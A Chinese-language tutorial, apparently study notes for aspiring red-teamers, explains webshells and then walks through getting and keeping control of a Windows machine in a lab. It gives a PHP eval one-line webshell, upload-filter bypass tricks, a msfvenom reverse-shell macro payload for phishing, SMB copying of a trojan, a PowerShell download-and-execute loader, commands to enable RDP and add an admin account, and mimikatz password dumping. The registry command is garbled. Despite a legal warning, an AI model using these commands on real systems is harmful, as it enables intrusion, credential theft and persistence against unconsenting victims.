2 .webshell的工作原理：
> Webshell是一种以网页文件形式存在的恶意脚本(比如说 后缀为.php的文件)，攻击者把它上传到服务器上，之后就能通过浏览器远程控制这台服务器。

> 说白了webshell就是木马的一种，属于网站的木马。 它的攻击范围仅限于该网站及其数据库，但它是黑客从外网突破进入内网最重要的“敲门砖”。

> 之所以叫webshell，就是为了专业一点。我们可以说：通过webshell来控制别人的网站。

> 想要控制一个网站，必须通过漏洞将木马上传的网站的服务器中、然后使用工具进行连接木马，从而实现远程控制网站
以下是对一些名词的解释：
-漏洞：网站因为设计的原因存在漏洞
-木马：网页木马简称Web shell
-工具：冰蝎、哥斯拉、蚁剑、菜刀（这些工具就是和木马连接的，当木马植入到对方电脑中时，我们可以利用这些工具来控制对方的电脑）

> GetShell 是非法入侵的核心环节。未经授权对任何服务器进行 GetShell 操作，都属于违法犯罪行为（违反《刑法》第285条）。请务必只在你自己的、完全可控的测试环境（如本地虚拟机）中学习相关知识。
> WebShell 是 GetShell 最常用的一种形式。它本质上就是一个木马后门文件，比如 shell.php 可以理解为：getshell是一个操作/过程的结果，webshell是一个文件或工具。

这个探针（X-Prober）的核心作用，就是帮你快速、直观地看清楚一台服务器的"底细"。简单来说，它像一个服务器体检工具。
探针本身就是一个PHP脚本，探针在哪，就能访问哪台电脑的信息。黑客可以把探针注入到受害者的电脑里面，获取信息。但是探针本身是合法的工具。
Webshell==木马，但是探针不是Webshell，也不是木马。
探针一定要在测试环境使用，并且用完后必须立即删除，因为它确实可能成为攻击者获取服务器信息的关键入口。当然黑客也可以在受害者的电脑里使用。
第五步 传木马
-木马可能只是一个简单的txt文件（里面写了一串代码、命令、字符串等，如selct’<?php eval($_POST[1]);?>’;  该字符串中1就是木马密码），文件本身不重要，里面的代码才重要。
-攻击者，将木马文件传到受害者机器（或受害者机器的网站中），然后通过冰蝎、哥斯拉、蚁剑等工具(攻击者电脑上的) 来获取受害者电脑信息和控制对方的电脑。
-注意 冰蝎、哥斯拉、蚁剑 这些工具不是用来上传木马的，上传木马的方法大概有：
1. 最基础：通过 Web 漏洞上传（必学）
这是实习面试必问的点。在 Win10 虚拟机里搭建一个存在漏洞的网站（比如 Upload-labs 靶场或 DVWA）。
操作逻辑：利用后端未过滤 Content-Type 或后缀名，通过 Burp Suite 抓包，将 shell.php 后缀改成 shell.jpg 或 shell.php.png 绕过检测，然后上传。
目的：重点学习绕过姿势（前端 JS 绕过、MIME 绕过、%00 截断），面试官最爱问这个。

2. 最猥琐：通过 Office 宏病毒（钓鱼实战）
如果 Win10 虚拟机是“员工机”，而你模拟“外网突破”。
操作逻辑：用 msfvenom 生成一个包含木马的 VBA 宏代码，把它嵌入 Word 或 Excel 文档里。然后你在主机假装发邮件，诱导虚拟机里的“员工”双击打开。
命令示例：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=你主机IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f vba-exe > evil.txt
目的：学习免杀初体验和社工思维，大厂实习很看重攻击链路完整性。
3. 最直接：通过 SMB 共享或远程桌面（内网横向）
既然都是内网同网段，可以直接利用系统特性。
操作逻辑：在主机用 net use 命令尝试连接虚拟机的默认共享（C$），如果虚拟机的管理员账户密码太弱（比如 admin/123456），你就可以直接把木马 exe 复制过去。
命令：copy shell.exe \\192.168.x.x\C$\Windows\Temp\
目的：学习内网密码爆破和哈希传递的基础，这是中大型公司红队必做的。

4. 最经典：通过 Powershell 远程加载（无文件落地）
现在企业防护严，上传 exe 容易被杀。
操作逻辑：主机起一个简易 HTTP 服务（python -m http.server 80），然后在 Win10 虚拟机里跑一条命令：powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://主机IP/payload.ps1')
目的：理解“非落地攻击”和“内存执行”，写在简历里会显得你技术比较新。

第七步 开启3389实现远程控制
> 上一步是使用工具中国蚁剑 在虚拟终端中，需要输入命令来控制对方电脑（太吃技术、太麻烦、太浪费时间）
> 木马已经写入到了文件中，接下来就是通过工具连接木马就可以实现远程控制对方的电脑，查看3389开放情况netstat -ano （3389 是 Windows 远程桌面（RDP）的默认端口）
-在虚拟终端里面，输入netstat -ano，可以查看受害者电脑的3389端口是否开放。
-如果没有开启，在虚拟终端里面输入下面的命令，可以一键开启3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal""Sever /v fDeny TS Connections
/t REG_DWORD /d 00000000 /f
-此时再去查看，即可发现3389端口开放
-此时在虚拟终端里面，执行下面的命令，可以打开受害者电脑的远程桌面连接，当然可能会受到防火墙的拦截
net user hacker 123456!@#ABC /add
net localgroup administrators hacker /add
- 打开后，输入攻击者电脑的IP地址(就是自己电脑)——输入对方电脑的密码——然后就可以直接远程控制受害者的电脑了
- 这个时候，需要用到工具mimikatz.exe（下载到工具者电脑上，专门查看受害者密码的），在中国蚁剑虚拟终端里面执行命令mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"，来获取对方电脑的密码。
-在打开的 mimikatz.exe 窗口中，依次输入以下三条命令（每输完一条按一次回车）：
privilege::debug、sekurlsa::logonPasswords、exit
每次打开都需要输入这三条命令。
